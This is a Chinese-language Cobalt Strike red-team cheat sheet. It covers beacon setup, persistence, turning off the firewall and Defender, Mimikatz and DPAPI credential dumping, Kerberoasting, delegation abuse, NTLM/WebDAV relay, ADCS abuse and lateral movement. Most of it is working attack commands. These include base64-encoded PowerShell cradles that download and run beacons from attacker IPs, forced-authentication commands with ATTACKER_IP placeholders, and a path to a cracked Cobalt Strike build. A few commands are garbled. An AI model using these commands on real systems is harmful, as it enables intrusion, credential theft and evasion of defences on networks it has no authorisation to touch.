
# 基本
- **建立服务器（攻击者）:**
```bash
sudo ./teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile
sudo ./teamserver [Attack IP] [Set Password] [配置文件]
```

- **链接服务器（攻击者）：**
直接启动 Cobalt Strike 客户端然后输入凭据链接即可。


#### 被动信息收集
Attack > System Profiler
可以设置重定向，后复制网址到被攻击机器，访问后就可以得到机器的基本信息。


#### 设置监听器
**http** (出口监听器)
**dns** (出口监听器)
**smb (p2p)** ：  可以使用 `PS C: \> ls \\.\pipe\` 列出所有当前正在收听的管道以获取灵感。
比如说 `TSVCPIPE-7ca725ce-7220-489f-a9b5-d4cad2bc1337`
**tcp**
**tcp-local**


#### 生成有效载荷
在 Payloads 中选择 `Windows Stageless Generate All Payloads`，生成所有有效载荷, 执行 http_x64.exe 后即可收到回应。


#### 命令 (Beacon)
```
pwd   当前目录路径
sleep 5   更快的回应
ps  (进程中有高权限用户可以直接steal_token)
screenshot
keylogger  (View > Keystrokes)    (使用jobs可以查看任务，jobkill ID 可以杀死keylogger的job)
clipboard  （粘贴板内容）
net logons  (用户登录会话)
run wmic service get name, pathname  (每个服务的列表及其可执行文件的路径)
shell + CMD
execute-assembly C:\Users\13461\Desktop\KALI_Tools\Seatbelt.exe -group=system (https://github.com/GhostPack/Seatbelt)
getuid

```


#### 数据透视侦听器
作用为转发流量，隐藏活动等
在图像界面右键 Attack 然后 Pivoting > Listener, 创建 demo-pivot
生成有效载荷： Payloads > Windows Executable (Stageless), 选中刚刚创建的 demo-pivot , 生成后直接执行即可。


#### 主机持久性
https://github.com/mandiant/SharPersist (添加各种命令要用到的工具)
BASE 编码要执行的命令
```
Win: 
$str = 'IEX ((new-object net.webclient).downloadstring("http://192.168.55.128:80/a"))'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

Linux:
echo 'IEX ((new-object net.webclient).downloadstring("http://192.168.55.128:80/a"))' | iconv -t UTF-16LE | base64 -w 0
```

- 计划任务程序
```powershell
execute-assembly C:\Users\13461\Desktop\KALI_Tools\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQA1AC4AMQAyADgAOgA4ADAALwBhACIAKQApAA==" -n "Updater" -m add -o hourly
```
`-t`: 持久化选项
`-c`: 执行的命令
`-a`: 命令的参数
`-n`: 任务的名称
`-m`: 添加任务(也可以 `remove`、`check` 和 `list`)
`-o`: 任务频率


- 启动文件夹
```powershell
execute-assembly C:\Users\13461\Desktop\KALI_Tools\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQA1AC4AMQAyADgAOgA4ADAALwBhACIAKQApAA==" -f "UserEnvSetup" -m add
```
`-f`: 另存为的文件名


- 注册表自动运行
```powershell
cd C:\ProgramData
upload C:\Users\13461\Desktop\CobaltSrike_4.9.1_Cracked_www.ddosi.org\Payloads\beacon_x64.exe
mv beacon_x64.exe fake_updater.exe
execute-assembly C:\Users\13461\Desktop\KALI_Tools\SharPersist.exe -t reg -c "C:\ProgramData\fake_updater.exe" -a "/q /n" -k "hkcurun" -v "fake_updater" -m add
```
`-k`: 修改的注册表项
`-v`: 创建的注册表项的名称

***==[+] IMPORTANT==***
cmd  (关闭一些列防护措施)
```powershell
netsh firewall set opmode disable && netsh firewall set opmode disable && netsh advfire all set allprofiles state off && powershell -c
"Set-MpPreference -DisableRealtimeMonitoring 1; Set-MpPreference
-DisableIOAVProtection 1; Add-MpPreference -ExclusionPath 'C:\U sers'" && powershell -c "New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -value 0" && REG ADD "HKLM\SOFTWARE\Microsoft\Windows\Curren Version\Po licies\System\LocalAccountTokenFilterPolicy" /t REG_DWORD /d 1
```
(将拥有 rdp/方便访问的用户加入已攻击的域计算机/域控制器)
```
run net localgroup administrators consultant /add  
```
禁用 AV 以及实时防护
```
beacon> powerpick Set-MpPreference -DisableRealtimeMonitoring $true
beacon> powerpick Set-MpPreference -DisableIOAVProtection $true
```

#### Exploit
- ###### Weak Service Permissions  弱服务权限
```
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
=== Modifiable Services ===
	[X] Exception: Exception has been thrown by the target of an invocation.
	[X] Exception: Exception has been thrown by the target of an invocation.
	[X] Exception: Exception has been thrown by the target of an invocation.
	[X] Exception: Exception has been thrown by the target of an invocation.
	Service 'svc_test' (State: Stopped, StartMode: Manual)

beacon> run sc qc svc_test
beacon> upload C:\users\attacker\desktop\tcp-local_svc.exe
beacon> run sc config svc_test binPath= C:\Windows\Tasks\tcp-local_svc.exe
beacon> run sc qc svc_test (验证)

beacon> run sc stop svc_test
beacon> run sc start svc_test
beacon> connect localhost 4444
```

- ######  `SeImpersonatePrivilege` 提权
```
http://10.10.140.20:8080/local (tcp-local.ps1) 

PS C:\Users\13461> $Command = "iex (new-object net.webclient).downloadstring('http://10.10.140.20:8080/local')"
PS C:\Users\13461> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
PS C:\Users\13461> $EncodedCommand = [Convert]::ToBase64String($Bytes)
PS C:\Users\13461> Write-Output $EncodedCommand

beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0ADAALgAyADAAOgA4ADAAOAAwAC8AbABvAGMAYQBsACcAKQA="

beacon> portscan 127.0.0.1 4444
beacon> connect localhost 4444
```

#### UAC Bypass / Mimikatz / Rubeus
- UAC Bypass
```bash
elevate uac-schtasks tcp-local (UAC bypass)
以高完整性运行
```

- Mimikatz 系列
```bash
beacon> mimikatz token::elevate ; lsadump::sam

也可以将 'token::elevate' 代替为 '!'
beacon> mimikatz !lsadump::sam (转储本地帐户的 NTLM 哈希)

beacon> mimikatz !sekurlsa::logonpasswords (转储内存中的NTLM明文密码)
beacon> mimikatz !sekurlsa::ekeys (转储当前登录用户的 Kerberos 加密密钥, AES256 密钥就是我们想要的密钥)
beacon> mimikatz !lsadump::cache  (域缓存凭证, MsCacheV2只能离线破解，需要格式化格式 $DCC2$<iterations>#<username>#<hash>)

(都会留下敏感资源的句柄)
```

- Rebeus
https://github.com/GhostPack/Rubeus
列出计算机上所有登录会话中的所有 Kerberos 票证
```bash
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x7049f /service:krbtgt [/nowrap (将Base64(key)格式化到一行,方便复制)] (获取TGT)
```
Rubeus 的 `dump` 命令将从内存中提取这些票证 - 但由于它使用 WinAPIs，因此不需要向 LSASS 打开可疑句柄。


# 域内技术
#### **==!! 内网上线 CS**
- 正向链接
生成 Beacon TCP , 0.0.0.0 4444
拿到域内 shell 后上传执行 exe，外网主机 connect 域内执行 exe 的主机
```
connect 10.0.20.99 4444  
```

- 反向链接
转发上线 -> 监听地址选择能访问的内网主机 ip -> Save
直接 exe 上线即可

**[+] 文件传输问题：**
***==(所有内网机器都可以使用此方法)==**
```
(外网机器创建端口转发的规则)
powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

(重定向端口外网机器beacon的8080到 teamserver的80端口)
rportfwd 8080 127.0.0.1 80

(将0.0.0.0:4445.exe 放在 teamserver的/b路径上) (site management -> host file), 远程下载文件执行 
powershell iwr -Uri http://外网ip:8080/b -outFile ./4445.exe
.\4445.exe

(正向链接内网机器的ip 4445)
connect 内网ip 4445
上线cs

(也可以使用smb.ps1， 然后link IP pipe)
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.10.128:8080/b'))"
powershell iwr -Uri http://10.10.10.128:8080/d -OutFile C:\programdata\rev.exe
```

#### 枚举
PowerView
```bash
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1

beacon> powershell Get-Domain [-Domain]（有用的信息包括域名、林名称和域控制）
beacon> powershell Get-DomainController [-Domain] | select Forest, Name, OSVersion | fl （返回当前域或指定域的域控制器）
beacon> powershell Get-ForestDomain [-Forest] (返回当前林或 `-Forest` 指定的林的所有域)
beacon> powershell Get-DomainPolicyData | select -expand SystemAccess (返回当前默认域策略)
beacon> powershell Get-DomainUser -Identity UserName -Properties DisplayName, MemberOf | fl
!beacon> powershell Get-DomainComputer -Properties DnsHostName | sort -Property   (枚举域中计算机)
	beacon> powershell Get-DomainComputer -Domain kato.org -Properties DnsHostName （枚举指定域计算机）
beacon> powershell Get-DomainOU -Properties Name | sort -Property Name (OU)
beacon> powershell Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName (组对象)
beacon> powershell Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName (组内用户)
beacon> powershell Get-DomainGPO -Properties DisplayName | sort -Property DisplayName （组策略对象）
!beacon> powershell Get-DomainTrust (枚举域以及域信任)
```

SharpView
https://github.com/tevora-threat/SharpView
```
beacon> execute-assembly C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe Get-Domain
```

配置管理器枚举
```
beacon> execute-assembly I:\0x0D_KALI_Tools\SharpSCCM.exe local naa -m wmi --no-banner  (search NetworkAccessPassword)
beacon> make_token cyberbotic.io\sccm_svc Cyberb0tic
```

#### 域信任
(枚举域以及域信任)
```
beacon> powershell Get-DomainTrust 
beacon> powershell Get-DomainComputer -Properties DnsHostName | sort -Property   (枚举域中计算机)
beacon> powershell Get-DomainComputer -Domain kato.org -Properties DnsHostName  （枚举指定域计算机）
beacon> powershell Get-DomainForeignGroupMember -Domain kato.org (枚举包含其域外部用户的任何组并返回其成员), 

(如果上一步查询有成员不属于指定域) 
beacon> powershell ConvertFrom-SID S-1-5-21-951568539-2129440919-2691824384-1109
beacon> powershell Get-DomainGroupMember -Identity "Kato Users" | select MemberName
```

使用 Kerberos 跳转域信任, 需要一个领域间密钥, 获取目标用户的 TGT, 用 `asktgt` 的 AES256 哈希值
```
beacon> dcsync DOMAIN

(Get TGT)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:USERNAME /domain:DOMAIN /ntlm:NTLMHASH /nowrap
```

Pass the Ticket  传递门票
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:LUID /ticket:
beacon> steal_token 3488
beacon> ls \\DOMAIN\c$
```


#### 用户模拟
-  Hash 传递
```bash
beacon> pth win2016\system 570a9a65db8fba761c1008a51d4c95ab (模拟hash会话)
beacon> rev2self (恢复初始会话)
```

- make_wtoken
```bash
beacon> make_token win2016\administrator Admin@123
beacon> remote-exec psexec/winrm/wmi win2016 whoami
```

- Processes
进程中有高权限用户可以直接 steal_token
```
beacon> steal_token PID
beacon> ls \\DOMAIN\c$
```

#### 横向移动
- psexec64
```
beacon> ls \\DOMAIN\c$
（如果可以访问,那就证明可以横向到指定域）
beacon> cd \\DOMAIN\c$\Windows\Tasks  (如果不能横向，那就先执行，再尝试)

beacon> jump winrm64 win2016 smb   (返回一个高完整性Beacon，该会话以交互的用户身份运行)
!beacon> jump psexec64 win2016 smb  (Beacon用户为SYSTEM)
```

- WMI
```
beacon> cd C:\progarmdata\
beacon> upload C:\Users\13461\Desktop\CobaltSrike_4.9.1_Cracked_www.ddosi.org\Payloads\smb_x64.exe
beacon> remote-exec wmi win2016 C:\programdata\smb_x64.exe
beacon> link win2016 msagent_cf
```
*其中, msagent_cf 为 smb_beacon 的 pipe 名字


#### 会话传递
- CS 上线主机 -> MSF
*Beacon 一定是得是 Stageless 的 reverse_http, 并且 Foreign 的 HTTP port 是没有被使用过的
```bash
msfconsole -q
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
...
msf6 exploit(multi/handler) > run

beacon> spawn msf
```
在 msf 中即可收到会话


#### 解密
-  解密DPAPI
```bash
(枚举用户的 vault)
1) beacon> run vaultcmd /list  
2) beacon> execute-assembly C:\Tools\Seatbelt.exe WindowsVault (枚举用户的 vault)

(加密凭证存储位置)
1) beacon> ls C:\Users\[username]\AppData\Local\Microsoft\Credentials  
2) beacon> execute-assembly C:\Tools\Seatbelt.exe WindowsCredentialFiles

(获取加密秘钥, 请求key)
1) beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-xxxxxx 
	# 类似于 'bfc5090d-22fe-4058-8953-47f6882f549e' 就是
beacon> mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-xxxxxx\bfc5090d-22fe-4058-8953-47f6882f549e /rpc
2) beacon> mimikatz !sekurlsa::dpapi  (如果最近有访问/解密解密, 就会留下缓存, MasterKey)

(解密 blob)
beacon> mimikatz dpapi::cred /in:C:\Users\[username]\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
```

- 解密计划任务凭据
```bash
(定位blob)
beacon> ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials  

(查看guidMasterKey)
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E

(转储缓存的 key, 记得对应GUID=guidMasterKey)
beacon> mimikatz !sekurlsa::dpapi

(解密)
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9
```


#### kerberos 攻击
- GetUserSPNs.py (Kerberoasting)
```
beacon> execute-assembly C:\Tools\Rubeus.exe kerberoast /simple /nowrap
然后john the hash

(可选，枚举设置了 SPN 的域用户)
beacon> execute-assembly C:\Tools\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName  
beacon> execute-assembly C:\Tools\Rubeus.exe kerberoast /user:mssql_svc /nowrap
```

- ASREP Roasting
```
beacon> execute-assembly C:\Tools\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
beacon> execute-assembly C:\Tools\Rubeus.exe asreproast /user:squid_svc /nowrap
```

##### [!] 约束委派攻击
- **无(非)约束委派**
非约束委派：当 `user` 访问 `service1` 时，如果 `service1` 的服务账号开启了 `unconstrained delegation`（非约束委派），则当 `user` 访问 `service1` 时会将 `user` 的 `TGT` 发送给 `service1` 并保存在内存中以备下次重用，然后 `service1` 就可以利用这张 `TGT` 以 `user` 的身份去访问域内的任何服务（任何服务是指 `user` 能访问的服务）
```
(查询返回允许进行不受约束委派的所有计算机)
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

1)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage （查找缓存是否有TGT的krbtgt)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap (提取TGT并利用)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFwj[...]MuSU8=
beacon> steal_token 1540
```

强制计算机帐户对这台计算机进行远程身份验证来获取计算机的 TGT
```
2)
beacon> execute-assembly C:\Tools\SharpSpoolTrigger.exe 目标domain 攻击(监听)domain 
beacon> execute-assembly C:\Tools\Rubeus.exe monitor /interval:10 /nowrap  (监控缓存所有新的TGT)

(TGS, 请求服务票据, 请求cifs服务票据)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/dc.acme.corp /user:dc$ /nowrap /ticket:doIFTjCCB[...]5DT1JQ  

(创建一个“网络登录”会话)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:ACME /username:Administrator /password:FakePass /ticket: 

(steal, 横向移动)
beacon> steal_token 3864
beacon> ls \\dc.acme.corp\c$
beacon> cd \\dc.acme.corp\c$\Windows\Tasks
beacon> jump psexec64 dc.acme.corp smb
```

- **约束委派**
S4U2Self：   允许服务代表用户获取其自身的 TGS
S4U2Proxy：允许该服务代表用户为第二个服务获取 TGS

通过允许约束委派的用户 , 就可以模拟域内任意用户获取 TGS 票据( .kirbi File ), 并注入到会话, 访问资源等
```
(查找拥有约束委派的计算机用户) 
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json

(利用 kekeo 请求该用户的 TGT)   (!! 也可以跳转到rubeus方法 !!)
kekeo.exe 
tgt::ask /user:redteam-iis /domain:redteam.red /password:Server12345 [/ticket:administrator.kirbi]
	/user: 服务用户的用户名 
	/password: 服务用户的明文密码 
	/domain: 所在域名
	/ticket: 可选参数，指定文件名，可能没用

(使用这张 TGT 通过伪造 s4u 请求以 administrator 用户身份请求访问 DOMAIN CIFS的 ST)
tgs::s4u /tgt:TGT_redteam-iis@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/AD-2008.redteam.red

_____________________________________________
* 使用 Rubeus.exe: (举例为 sql-2$ 设定为拥有约束委派的权限)

(需要获得受信任的约束委派账户的TGT)
beacon> execute-assembly C:\Tools\Rubeus.exe triage (查询账户的TGT)
(如果拥有用户的明文密码或者hash ， 也可以使用asktgt请求TGT)

(导出用户票据, Base64EncodedTicket)
beacon> execute-assembly C:\Tools\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

（使用TGS执行s4u，请求cifs票据 TGS）
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:time/ad.kato.org /altservice:cifs /user:DB$ /nowrap /ticket:

（使用票据)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:KATO.ORG /username:Administrator /password:FakePass /ticket:
```

- **基于资源的约束委派**
首先添加机器账户，修改 `msDS-AllowedToActOnBehalfOfOtherIdentity` 值为机器账户的 `sid`，然后以机器账户的身份伪造成 `administrator` 申请一张访问此机器账户机器的 `ticket` ，因为机器账户没有配置约束性委派，所以这张票据是不可转发的，但是在基于资源的约束性委派中，票据是否可以转发不重要，对之后对 `s4u2proxy` 不影响，最后利用这张 `ticket` 去申请访问修改了 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性的机器
```
beacon> powershell-import C:\Users\13461\Desktop\KALI_Tools\PowerView.ps1
beacon> powershell-import C:\Users\13461\Desktop\KALI_Tools\Powermad.ps1

(先决条件)
# beacon> powershell Get-DomainUser Administrator | Select-Object DistinguishedName (看DC就好)
beacon> powershell Get-DomainObject -Identity "DC=xx,DC=xxx,DC=xxx" -Properties ms-DS-MachineAccountQuota (> 0)
beacon> get-domaincontroller | select name,osversion | fl (Version > Windows Server 2012)
beacon> powershell get-domaincomputer DC | select name,msds-allowedtoactonbehalfofotheridentity | fl   (变量为空 ?)

(创建 FAKE 计算机)
beacon> powershell new-machineaccount -machineaccount fakecomputer -password $(ConvertTo-SecureString 'xek@123' -asplaintext -force)
# 验证是否添加成功 
# beacon> powershell net group "domain computers" /domain

(获取 FAKE 计算机 SID)
beacon> powershell get-domaincomputer fakecomputer | select -expand objectsid

(配置基于资源的约束委派)
beacon> powershell $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer fakecomputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$rsdb} -Verbose

(验证配置)
beacon> powershell Get-DomainComputer fakecomputer -Properties msds-allowedtoactonbehalfofotheridentity

(获取 fakecomputer 的aes256_cts_hmac_sha1)
beacon> execute-assembly C:\Tools\Rubeus.exe hash /password:xek@123 /user:fakecomputer$ /domain:DOMAIN

(通过 S4U2Proxy 获取最终 TGS 票据)
beacon> execute-assembly C:\Tools\Rubeus.exe s4u /user:fakecomputer$ /aes256:HASH /impersonateuser:Administrator /domain:DOMAIN /msdsspn:cifs/DOMAIN /nowrap
# /impersonateuser: 要冒充的用户

(使用票据访问目标计算机资源)
beacon> execute-assembly C:\Tools\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DOMAIN /username:Administrator /password:FakePass /ticket:doIGcD[...]MuaW8=
beacon> steal_token ProcessID
beacon> ls \\DOMAIN\c$
# 清除配置基于资源的约束委派
# beacon> powershell Set-DomainObject fakecomputer -Clear 'msds-allowedtoactonbehalfofotheridentity' -Verbose
```


**影子凭据 （权限维持）**
```
beacon> execute-assembly C:\Tools\Whisker.exe add /target:dc-2$ (将新的密钥对添加到目标)
beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:dc-2$ /certificate:MIIJuA[...snip...]ICB9A= /password:"y52EhYqlfgnYPuRb" /nowrap  (请求 TGT)

(删除影子凭据)
beacon> execute-assembly C:\Tools\Whisker.exe list /target:dc-2$
beacon> execute-assembly C:\Tools\Whisker.exe remove /target:dc-2$ /deviceid:58d0ccec-1f8c-4c7a-8f7e-eb77bc9be403
```

#### SOCKS 代理  
beacon 中的内网，代理出来可以通过
```socks5
beacon> socks 1080  (socks4a)
```
然后在 server 端就可以看到本地1080端口被绑定, 可以用 proxychains 来进行访问 cs 中 **beacon 能访问到的**内网主机
`proxychains.conf： socks4 127.0.0.1 1080`
`sudo proxychains nmap -n -Pn -sT -p 445 10.10.10.10 `

简单的例子，在 kali 中通过 beacon 的 socks5访问 beacon 所在内网的主机，拿到 shell
```
proxychains getTGT.py -dc-ip 10.10.122.10 -aesKey 4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 dev.cyberbotic.io/jking
export KRB5CCNAME=jking.ccache
proxychains psexec.py -dc-ip 10.10.122.10 -target-ip 10.10.122.30 -no-pass -k dev.cyberbotic.io/jking@web.dev.cyberbotic.io
```

同理，Firefox 中使用 Foxyproxy, 添加 socks5, IP, Port, Username, Password 就可以达到访问内网 web

- 反向端口正向 (流量转发)
```
beacon> rportfwd 8080 127.0.0.1 80 (绑定0.0.0.0:8080 到 127.0.0.1:80)
访问 IP:8080 就相当于访问 IP：80
```
[!] **OPSEC**
```
(防止弹窗，提前创建好规则，需要管理员权限)
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
beacon> powershell Remove-NetFirewallRule -DisplayName "8080-In" (删除规则)
```

#### 中继
##### NTLM 中继
(需要在捕获 SMB 流量的计算机上获取 SYSTEM 信标)
```
(因为445和80端口都被占用，所以更改利用端口为8445和8080, 创建规则允许出栈防止弹窗)
beacon> powershell New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445   
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080  

(重定向端口)
beacon> rportfwd 8445 localhost 445  (用于SMB捕获)
beacon> rportfwd 8080 localhost 80   (用于上线cs)

(开启socks代理以方便使用ntlmrelayx)
beacon> socks 1080

(启动ntlmrelayx,base编码为SMB 负载)
sudo proxychains ntlmrelayx.py -t smb://10.10.122.10 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADMALgAxADAAMgA6ADgAMAA4ADAALwBiACIAKQA='

(https://github.com/praetorian-inc/PortBender ,将流量从 445 重定向到端口 8445)
beacon> cd C:\Windows\system32\drivers
beacon> upload C:\Tools\PortBender\WinDivert64.sys
beacon> PortBender redirect 445 8445

(正在被攻击机上执行身份验证)
dir \\10.10.123.102\relayme

(链接到 Beacon)
beacon> link dc-2.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
```

##### [?] webDav 中继
```
可以强制机器帐户对主机进行身份验证，并将其与基于资源的约束委派结合以获得更高的访问权限。它允许攻击者通过 HTTP 而不是 SMB 进行身份验证
要求：WebClient服务

禁用 HTTP
sudo vi /usr/share/responder/Responder.conf

生成一个Windows机器名：sudo responder -I eth0
Responder Machine Name     [WIN-33CUG5OKGI8]

准备针对 DC 的 RBCD：
python3 ntlmrelayx.py -t ldaps://dc --delegate-access -smb2support

发现 WebDAV 服务
webclientservicescanner 'domain.local'/'user':'password'@'machine'
crackmapexec smb 'TARGETS' -d 'domain' -u 'user' -p 'password' -M webdav
GetWebDAVStatus.exe 'machine'

触发身份验证以中继到我们的 nltmrelayx: PetitPotam.exe WIN-UBNW4FI3AP0@80/test.txt 10.0.0.4，必须使用 FQDN 或完整的 netbios 名称指定侦听器主机，例如logger.domain.local@80/test.txt. 指定 IP 会导致匿名身份验证，而不是系统。
dementor.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
SpoolSample.exe "ATTACKER_IP" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt"

#PetitPotam
Petitpotam.py "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
PetitPotam.exe "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
使用创建的帐户请求服务票证：
.\Rubeus.exe hash /domain:purple.lab /user:WVLFLLKZ$ /password:'iUAL)l<i$;UzD7W'
.\Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F /impersonateuser:Administrator /msdsspn:host/pc1.purple.lab /altservice:cifs /nowrap /ptt
ls \\PC1.purple.lab\c$
# IP of PC1: 10.0.0.4
```

#### ADCS 攻击
枚举易受攻击的模板
```
beacon> execute-assembly C:\Tools\Certify.exe find /vulnerable
beacon> execute-assembly C:\Tools\Certify.exe find /vulnerable /currentuser
```
如果有注册权限，那就可以为任何其他域用户（包括域管理员）请求证书，并用于身份验证

```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:administrator
```

转换为 pxf 格式
```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

使用 Rubeus 获取 TGT
```
beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:administrator /certificate:.\cert.pfx /getcredentials /show /nowrap
```
拿到 HTLM 的 HASH

#### 组策略
```
beacon> powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

解析 GPO 名称和主体的 SID
beacon> powershell Get-DomainGPO -Identity "CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath
beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
```

#### MSSQL
```
https://github.com/NetSPI/PowerUpSQL
https://github.com/skahwah/SQLRecon

枚举 MS SQL Server
